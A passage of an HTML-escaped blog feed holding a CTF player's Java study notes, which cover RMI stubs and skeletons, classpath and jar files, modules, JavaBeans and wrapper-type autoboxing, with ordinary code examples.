&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">worldClock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WorldClock&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 正常调用接口方法:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">LocalDateTime&lt;/span> &lt;span style="color:#111">now&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">worldClock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Asia/Shanghai&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 打印调用结果:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">now&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对客户端来说，客户端持有的&lt;code>WorldClock&lt;/code>接口实际上对应了一个“实现类”，它是由&lt;code>Registry&lt;/code>内部动态生成的，并负责把方法调用通过网络传递到服务器端。而服务器端接收网络调用的服务并不是我们自己编写的&lt;code>WorldClockService&lt;/code>，而是&lt;code>Registry&lt;/code>自动生成的代码。我们把客户端的“实现类”称为&lt;code>stub&lt;/code>，而服务器端的网络服务类称为&lt;code>skeleton&lt;/code>，它会真正调用服务器端的&lt;code>WorldClockService&lt;/code>，获取结果，然后把结果通过网络传递给客户端&lt;/p>
&lt;p>RMI通过自动生成stub和skeleton实现网络调用，客户端只需要查找服务并获得接口实例，服务器端只需要编写实现类并注册为服务&lt;/p>
&lt;p>整个过程由RMI底层负责实现序列化和反序列化，很容易产生安全问题&lt;/p>
&lt;hr>
&lt;p>其它的语法等遇到了再学，估计还会有个Java语法补全下篇（如果我不懒的话&lt;/p></description></item><item><title>Java学习笔记Ⅰ</title><link>https://amiaaaz.github.io/2022/02/27/java-study-notes-01/</link><pubDate>Sun, 27 Feb 2022 01:28:17 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/27/java-study-notes-01/</guid><description>&lt;p>ctf里有几类题我是见到之后拔腿就跑，比如java和xss，对于后者，最近杂七杂八的学了很多js和前端的知识 没那么发怵了，而前者……不多说了，学学学！&lt;/p>
&lt;p>本篇学习内容来自于&lt;a href="https://www.liaoxuefeng.com/wiki/1252599548343744">廖雪峰Java教程&lt;/a>，个人感觉比较适合对其它语言也有一点掌握的人&lt;/p>
&lt;p>本机win10，为了兼容一些程序暂时有java8和11两个版；ide使用idea&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220226170711379.png" alt="image-20220226170711379">&lt;/p>
&lt;hr>
&lt;h2 id="java基础">Java基础&lt;/h2>
&lt;h3 id="java程序结构">java程序结构&lt;/h3>
&lt;ul>
&lt;li>src/xxx.java，类名为文件名，main为入口（idea直接输main会自动补全），idea格式化代码ctrl+shift+F&lt;/li>
&lt;li>类class习惯大写字母开头，方法method习惯小写字母开头，必须带分号（不同于js可有可无）&lt;/li>
&lt;/ul>
&lt;h3 id="classpathjar">classpath&amp;amp;jar&lt;/h3>
&lt;ul>
&lt;li>&lt;code>classpath&lt;/code>是JVM的环境变量，是一组目录的集合（分隔符由系统定&lt;/li>
&lt;li>推荐在启动JVM时设置&lt;code>classpath&lt;/code>变量，不要污染系统环境（可以放心的交给idea&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -classpath .&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\w&lt;/span>ork&lt;span style="color:#8045ff">\p&lt;/span>roject1&lt;span style="color:#8045ff">\b&lt;/span>in&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\s&lt;/span>hared abc.xyz.Hello
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>java -cp .&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\w&lt;/span>ork&lt;span style="color:#8045ff">\p&lt;/span>roject1&lt;span style="color:#8045ff">\b&lt;/span>in&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\s&lt;/span>hared abc.xyz.Hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>不要把任何Java核心库添加到classpath中！默认的当前目录&lt;code>.&lt;/code>对于绝大多数情况都够用&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jar包实际上就是一个zip格式的压缩文件，包含&lt;code>package&lt;/code>组织的目录层级，以及各个目录下的所有文件（包括&lt;code>.class&lt;/code>文件和其他文件），注意不含&lt;code>bin&lt;/code>目录（注意层级）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>可以把jar理解为n多个class文件的容器，JVM自带的Java标准库rt.jar也是以jar形式进行存放&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jar不关心class之间的依赖，如果漏掉的话在运行期极有可能抛出&lt;code>ClassNotFoundException&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果我们要执行一个jar包的&lt;code>class&lt;/code>，就可以把jar包放到&lt;code>classpath&lt;/code>中&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -cp ./hello.jar abc.xyz.Hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>MANIFEST.MF&lt;/code>文件可以提供jar包的信息，如&lt;code>Main-Class&lt;/code>&lt;/li>
&lt;li>分析题目中给出jar包时我一般直接改zip解压，用idea打开整个目录作为项目（idea yyds&lt;/li>
&lt;/ul>
&lt;h3 id="模块">模块&lt;/h3>
&lt;ul>
&lt;li>Java9后引入，解决依赖问题，控制jar之间的相互调用&lt;/li>
&lt;li>把一堆class封装为jar仅仅是一个打包的过程，而把一堆class封装为模块则不但需要打包，还需要写入依赖关系，并且还可以包含二进制代码（通常是JNI扩展）&lt;/li>
&lt;li>以java的标准库rt.jar为例，被拆为&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>java.base.jmod
java.compiler.jmod
java.datatransfer.jmod
java.desktop.jmod
...
&lt;/code>&lt;/pre>&lt;p>以&lt;code>.jmod&lt;/code>为拓展名标识，每个文件都是一个模块，模块&lt;code>java.base&lt;/code>对应的文件就是&lt;code>java.base.jmod&lt;/code>&lt;/p>
&lt;ul>
&lt;li>模块之间的依赖关系已经被写入到模块内的&lt;code>module-info.class&lt;/code>文件了。所有的模块都直接或间接地依赖&lt;code>java.base&lt;/code>模块，只有&lt;code>java.base&lt;/code>模块不依赖任何模块，它可以被看作是根模块，好比所有的类都是从&lt;code>Object&lt;/code>直接或间接继承而来&lt;/li>
&lt;/ul>
&lt;p>编写模块的部分暂略。&lt;/p>
&lt;h3 id="javabean">JavaBean&lt;/h3>
&lt;p>指的是符合某种规范的一种编程模式或编程思想（个人理解&lt;/p>
&lt;p>部分Python爱好者也喜欢这么写，可拓展性强，就是很臃肿&lt;/p>
&lt;ul>
&lt;li>写方法&lt;code>setter&lt;/code>，读方法&lt;code>getter&lt;/code>，只有其中一种属性之一的被称为只写/读属性——满足这样规范的class被称为JavaBean&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 读方法:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Type&lt;/span> &lt;span style="color:#75af00">getXyz&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 写方法:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setXyz&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Type&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>要枚举一个JavaBean的所有属性，可以直接使用Java核心库提供的&lt;code>Introspector&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.beans.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">BeanInfo&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Introspector&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBeanInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取属性列表
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">PropertyDescriptor&lt;/span> &lt;span style="color:#111">pd&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">info&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPropertyDescriptors&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getReadMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriteMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getAge&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setAge&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="语法基础">语法基础&lt;/h2>
&lt;h3 id="变量数据类型">变量&amp;amp;数据类型&lt;/h3>
&lt;ul>
&lt;li>类似c的赋值风格：&lt;code>类型 变量名 = 变量值&lt;/code>（不同于go）&lt;/li>
&lt;li>程序设计的一个重要原则：数据的存储和显示要分离&lt;/li>
&lt;li>执行&lt;code>int x = n&lt;/code>这样的变量赋值时，相当于两步操作，x与n是不同的存储单元&lt;/li>
&lt;li>基本类型有&lt;code>byte&lt;/code>, &lt;code>int&lt;/code>, &lt;code>short&lt;/code>, &lt;code>long&lt;/code>, &lt;code>float&lt;/code>, &lt;code>double&lt;/code>, &lt;code>boolean&lt;/code>, &lt;code>char&lt;/code>（表示ascii或一个Unicode字符），不可赋值null&lt;/li>
&lt;li>引用类型为所有class和interface类型，可赋值为null表示空&lt;/li>
&lt;li>使用对应的Wrapper Class包装类可以将基本类型视为引用类型(class)，好处是可以使用大量的实用方法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">100&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通过new操作符创建Integer实例(不推荐使用,会有编译警告):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通过静态方法valueOf(int)创建Integer实例:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通过静态方法valueOf(String)创建Integer实例:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;100&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intValue&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>每种基本类型都有其包装类型&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">基本类型&lt;/th>
&lt;th style="text-align:left">对应的引用类型&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">boolean&lt;/td>
&lt;td style="text-align:left">java.lang.Boolean&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">byte&lt;/td>
&lt;td style="text-align:left">java.lang.Byte&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">short&lt;/td>
&lt;td style="text-align:left">java.lang.Short&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">int&lt;/td>
&lt;td style="text-align:left">java.lang.Integer&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">long&lt;/td>
&lt;td style="text-align:left">java.lang.Long&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">float&lt;/td>
&lt;td style="text-align:left">java.lang.Float&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">double&lt;/td>
&lt;td style="text-align:left">java.lang.Double&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">char&lt;/td>
&lt;td style="text-align:left">java.lang.Character&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>所有的整数和浮点数的包装类型都继承自&lt;code>Number&lt;/code>，因此，可以非常方便地直接通过包装类型获取各种基本类型&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 向上转型为Number:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#111">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">999&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取byte, int, long, float, double:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">byteValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">ln&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">longValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">floatValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">d&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doubleValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>由于java中并不存在无符号整型这一说，全部都是有整型的，需要通过包装类型的静态方法来完成，比如&lt;code>Byte.toUnsignedInt()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>int&lt;/code>和对应的&lt;code>Integer&lt;/code>可以互相转化，甚至直接使用&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Integer n = 100; // 编译器自动使用Integer.valueOf(int)
int x = n; // 编译器自动使用Integer.intValue()
&lt;/code>&lt;/pre>&lt;p>这种直接把&lt;code>int&lt;/code>变为&lt;code>Integer&lt;/code>的赋值写法，称为自动装箱（Auto Boxing）；反过来，把&lt;code>Integer&lt;/code>变为&lt;code>int&lt;/code>的赋值写法，称为自动拆箱（Auto Unboxing）&lt;/p>
&lt;p>注意：自动装箱和自动拆箱只发生在编译阶段，目的是为了少写代码。&lt;/p>
&lt;p>装箱和拆箱会影响代码的执行效率，因为编译后的&lt;code>class&lt;/code>代码是严格区分基本类型和引用类型的。并且，自动拆箱执行时可能会报&lt;code>NullPointerException&lt;/code>（两种类型对null的容忍度不同&lt;/p>
